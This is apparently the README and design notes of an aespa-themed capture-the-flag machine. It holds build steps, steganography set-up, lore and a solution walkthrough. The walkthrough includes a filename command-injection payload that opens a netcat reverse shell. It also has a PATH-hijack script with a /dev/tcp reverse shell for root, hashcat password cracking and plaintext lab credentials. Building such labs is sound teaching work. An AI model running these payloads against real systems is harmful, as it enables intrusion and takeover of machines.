# Build & run 
```
docker compose build --no-cache && docker compose up -d
```

go to localhost:97 to find post-auth code injection vulnerability
- MUST: login as `armageddon` (password `armageddonarmageddon`), go to settings, set command `sh -c "echo this filename has been renamed: \$FILE"` AFTER RENAME, and save.

port:87: vulneravel a code injection pelo rename
- precisa entrar como admin e setar ```sh -c "echo this filename has been renamed: $FILE"``` after RENAME


# Resolvendo CTF
- va /scene.html
    strings, exiftool, break hash ()
- acessa FTP senha cooper
- encontre file browser. use o hook depois de RENAME pra revshell. hook deve ser configurado apos docker build
- leia o cronjob e faca path hijack: crie executavel supernova/singularity/singularity

## steganography nas midias
exiftool -Artist="$z2QTv.Ap80vCBfUGUh5riTd3kzq9SrYJwrQGYuhOQDbbXG3R5cV2N8m3HxxJ3gPdUv7eSRKziL.nOBRtjtklu0" -xmptoolkit="$<yummy>$"   -Encoder="$6"  strange_phenomenon_giselle.mp4


no video em scene1

$ strings SALTy_and_sweet.gif 
...
;l'existence precede l'essence==
lexistence

echo -n 'cooper' | openssl passwd -6 -salt 'lexistence' -stdin
$6$lexistence$Yp2586tEONHHNO8K2K4eAH6iEajQEV6HHPg65vkXQFWLGVO9K9fg.TWDrhqsqXlgLpV55qwAgOUGlEsO//EY//

$ hashid -m '$6$lexistence$Yp2586tEONHHNO8K2K4eAH6iEajQEV6HHPg65vkXQFWLGVO9K9fg.TWDrhqsqXlgLpV55qwAgOUGlEsO//EY//'
Analyzing '$6$lexistence$Yp2586tEONHHNO8K2K4eAH6iEajQEV6HHPg65vkXQFWLGVO9K9fg.TWDrhqsqXlgLpV55qwAgOUGlEsO//EY//'
[+] SHA-512 Crypt [Hashcat Mode: 1800]


hashcat -m 1800 -a 0 hash.txt p.txt 
...
Candidates.#1....: cooper -> cooper
...




echo -n "lexistence" | md5sum | awk '{print $1}'
f8821d1fa146c69a894aa8260c5a645a

$6$lexistence$.p80vCBfUGUh5riTd3kzq9SrYJwrQGYuhOQDbbXG3R5cV2N8m3HxxJ3gPdUv7eSRKziL.nOBRtjtklu0


insere string base 64
echo "SGkgYWVzcGEuIEkgZG9uJ3Qga25vdyBpZiB5b3UncmUgdGhlIHJlYWwsIHRoZSBmYWtlLCB0aGUgQUkgYWVzcGEgb3Igd2hhdGV2ZXIsIEknbGwgbGV0IHlvdSBsaXZlIGlmIHlvdSBjYW4gbWFrZSB0aHJvdWdoIHRoaXMgY2hhbGxlbmdlLg==" >> app/media/Welcome.mp4 
echo "You are one of multiple alternate selves. You live in a fake city. You may be the one building the world, or the one destroying it in order to reach reality." >> "/home/renk/unb/tac cybersec/who-ae-you-ctf/app/media/welcome.mp4"
echo "RG8geW91IHJlbWVtYmVyIGhvdyBpdCB3YXMsIHdoZW4gYWxsIG9mIHRoaXMgbWVzcyBiZWdhbj8gVGhhdCdzIC9zY2VuZTEgb2YgdGhpcyBzdG9yeSAgIA==" >> "/home/renk/unb/tac cybersec/who-ae-you-ctf/app/media/welcome.mp4"

Hi aespa. I don't know if you're the real, the fake, the AI aespa or whatever, I'll let you live if you can make through this challenge. 
You are one of multiple alternate selves. You live in a fake city. You may be the one building the world, or the one destroying it in order to reach reality.
Do you remember how it was, when all of this mess began? That's /scene1 of this story   

to delete 
sed -i '$d' "/home/renk/unb/tac cybersec/who-ae-you-ctf/app/media/welcome.mp4"


scene1.html, inspecionar video: username (artista) e password (comentario) do ftp, ferramenta exiftool

echo -n "cooper" | openssl kdf -keylen 32 -kdfopt digest:SHA256 -kdfopt pass:stdin -kdfopt salt:"l\`existence precede l\`essence" -kdfopt iter:600000 PBKDF2 | base64
MDE6QkI6MTE6QjM6ODE6Mzg6NjA6MjQ6QzM6REM6QkU6QkU6MkU6MDg6N0U6NzM6NzQ6QUI6QzY6
MkQ6NzQ6RDY6NzI6QzY6MEU6RjY6OEY6Q0E6RUE6Qjg6OEI6N0QKCg==


scene1.html, inspecionar gif : SALT da password pkbmc2. usado p criptografia: https://8gwifi.org/pbkdf.jsp. ferramenta comando `strings`
ftp: user aespa password cooper
    todo: binwalk coloca link/dica do filebrowser ('see port 97' )


steghide embed -cf "PortalOfSelf.jpg" -ef secret.txt -p "complexity"
cat "aespa 에스파  LEMONADE Complæxity Trailer .webm" "PortalOfSelf.jpg" > ae_glitch.webm
binwalk -e ae_glitch.webm


cp "rich_man_trailer.webm" rich_man_trailer_combined.webm
cat whats_happenning.txt >> rich_man_trailer_combined.webm


## foothold: CVE-2026-35585  no file-browser
- rename um arquivo pra `; nc <IP> 4444 -e sh #` e dps rename dnv p qqr csa, vai rodar (rode listener antes)


## PE
after login as supernova 

explore until sudo password is found in .git old file history
```
```

explore until cronjob is found 
```
$ sudo  cat  /etc/cron.d/wda4
PATH=/home/supernova/singularity:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:
* * * * * root singularity >> /var/log/singularity.log 2>&1
```

then execute path hijack
```
cd singularity
echo '#!/bin/bash' > singularity
echo 'bash -i >& /dev/tcp/192.168.15.14/4444 0>&1' >> singularity
chmod +x singularity
export PATH=/home/supernova/singularity:$PATH
echo $PATH
```

which echo
# Should output: /tmp/echo
```
## Credenciais
- file browser na localhost:97
```
    filebrowser users add armageddon armageddonarmageddon \
        --database "$DB" \
        --perm.admin
        
    filebrowser users add complexity complexitytrailer \
    ```

# TODO
- arrumar o character encoding no apache (acento ~ ` etc)
ftp: binwalk na imagem leva a um login 
- Colocar um video em index ou alterar a imagem (insira a string base64 notada neste readme), para colocar intrucoes explicando o CTF :
- - Sit back and relax. The story will be told to you. 
- - Entenda esta narrativa linearmente.
- - adicionar dicas  pra motivar as outras regras
- - deixar o 'light ... run...'
- - - adicionar em /run uma imagem com dica facil (comando strings) pra porta do FTP 'see port <FTP_PORT>'
~~bruteforce no login  (user winter password flowers )~~ (ja tem bruteforce no hash da senha em scene1, pra acessar ftp)


- add steghide ningning  SHA 256
    I won't make you search every picture here, because if you can search one of them, you can search all of them.
    If you found this message, what can truly help you is this: walk through door number 48? .
    easy rockyou 

- add binwalk to winter (flowers video, fowers has steghide w password flowers )
    password to steghid in ftp OP fucking steganography 
    inside the portal pic, there is a big file, inside it there's some 
        flie is big so it's easily noticeable 
        big file strings just gives you the credentials to file browser 
        if file browser RCE then we're FUCKED
        do this: FTP in common port ? nah

- winter
- - binwalk flowers video named ae-ningning_kermit_dance.mp4 (video can be found from this name, big hint, easy)
- - flowers video has steghide password flowers (rockyou)
no need for thorough binwalk, this is an easy version. for FTP 

- karina pic:
 -  - this is a tutorial for your near future 

if they find FTP they find filebrowser: 
put fb info inside images in FTP 
🔍 Why it works against tools: steghide, stegseek scan pixel data; they never look past EOI. binwalk might flag trailing data as “raw”, but without the key and the knowledge to extract it properly, it’s just random noise.

    ⚠️ Be aware: the appended data can be stripped by re‑encoding the image. But for a CTF where the image is served as‑is, this is excellent.

how would they even find that if they dont know 

bash

# create a payload file
echo "secret info" > payload.txt
# encrypt with a strong key (e.g., AES-256)
openssl enc -aes-256-cbc -salt -in payload.txt -out payload.enc -pass pass:"CTF2026"
# append the encrypted blob to a JPEG
cat cover.jpg payload.enc > hidden.jpg

Extract
bash

# find the offset of the raw encrypted data (after FFD9)
dd if=hidden.jpg of=extracted.enc bs=1 skip=... # (manually locate position)
# or use binwalk / hex editor; then decrypt
openssl enc -aes-256-cbc -d -in extracted.enc -out revealed.txt -pass pass:"CTF2026"

- portal pic 
- flowers vid inside 




bash

# create a payload file
echo "secret info" > payload.txt
# encrypt with a strong key (e.g., AES-256)
openssl enc -aes-256-cbc -salt -in payload.txt -out payload.enc -pass pass:"CTF2026"
# append the encrypted blob to a JPEG
cat cover.jpg payload.enc > hidden.jpg

Extract
bash

# find the offset of the raw encrypted data (after FFD9)
dd if=hidden.jpg of=extracted.enc bs=1 skip=... # (manually locate position)
# or use binwalk / hex editor; then decrypt
openssl enc -aes-256-cbc -d -in extracted.enc -out revealed.txt -pass pass:"CTF2026"




- hide file-browser link in FTP 


# Problemas
cuidado pra nao usar nginx, ou qqr csa q introduz unauthenticated RCE 


nota: flower e cooper estao na rockyou.txt


# Misc NOtes

there is a process running as root, a script 
the script calls a command by name 
user will try to 

its in folder or process /armageddon
script is synk 
synk echoes something like ' You are one of multiple alternate selves. You live in a fake city. You may be the one building the world, or the one destroying it in order to reach reality ' 

would be cool if synk was a crontab -- is that on theme with cron or not? 

supernova non root user can create a file to path hijack, but supernova whole filesys is locked by sudo write (is it possible to lock this do they may ONLY write if they got SUDO password?)

supernova doesnt actually get to run anything as root despite having a sudo -- is this possible? if not, give them sudo only for the specific commands for file write & read


for consider that the story of this ctf follows aespa's story 

ctf starts as giselle in scene 1

the ae are born, lexistence precedes lessence

a strange phenomenon is happening

the ae copied aespa looks and are living their own lives releasing music 

the ae and the aespa are all copied 

winter realizes that theyve been living in a fake world and to reach reality they must destroy parts and embrace hidden parts (can be a reference to git) of  themselves (steal root)


this is the official lore 
Armageddon’s lore is about aespa bringing destruction upon themselves in order to destroy the artificial world they exist in. WDA are the 4 horses of the apocalypse bringing destruction

WINTER merging with the giant eye and growing wings symbolizes awakening, while the collapsing AI city represents destruction of that fake controlled reality

The hip hop versions of aespa represent theirselves trapped in the system while the bizarre superhuman versions are their future evolved selves

aespa lore explained by Karina

Karina: The aespa in reality and the fake aespa keeps getting mixed together, the reason is that in reality, us, the Armageddon aespa, Dirty Work aespa, Whiplash aespa etc the aespas that should be in different worlds have banded together in one place. For example, there are four more of me here, so it gets confusing right? So a rupture forms in this world






| Technical Concept    | Story Meaning                 |
| -------------------- | ----------------------------- |
| Current files        | Present identity              |
| History              | Forgotten memories            |
| Deleted content      | Repressed self                |
| Branches             | Alternate selves              |
| Merge                | Accepting multiple identities |
| Root                 | New, merged, real reality. original root is one thing, but achieving PE root is like merging hidden parts and compromising the previous fake               |
| Privilege escalation | Reaching the truth            |
| Enumeration          | Self-discovery                |
| Hidden files         | Suppressed memories           |


change user names in machine image: 
- aespa: the one serving website
- WTMW: file browser
- supernova: ftp
- armageddon: root 